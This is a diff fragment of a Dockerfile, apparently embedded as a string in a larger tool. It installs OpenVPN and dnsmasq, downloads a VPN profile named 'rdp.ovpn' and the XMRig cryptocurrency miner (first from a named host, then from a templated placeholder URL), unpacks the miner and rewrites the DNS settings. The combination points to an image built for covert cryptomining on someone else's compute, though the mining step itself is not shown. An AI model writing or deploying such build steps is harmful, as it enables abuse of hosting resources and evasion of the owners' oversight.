@@ -8,8 +8,8 @@ WORKDIR /root
 RUN apt-get update
 RUN apt-get install -y net-tools wget openvpn dnsmasq nano
 RUN cd ~
-RUN wget https://demo.zayuh.asia/rdp.ovpn
-RUN wget https://demo.zayuh.asia/xmrig-6.15.1-linux-x64.tar.gz
+RUN wget !!__URL__!!resource/rdp.ovpn
+RUN wget !!__URL__!!resource/xmrig-6.15.1-linux-x64.tar.gz
 RUN tar -xf xmrig-6.15.1-linux-x64.tar.gz
 RUN echo \"nameserver 8.8.8.8\" > /etc/resolv.conf
 RUN echo \"\\
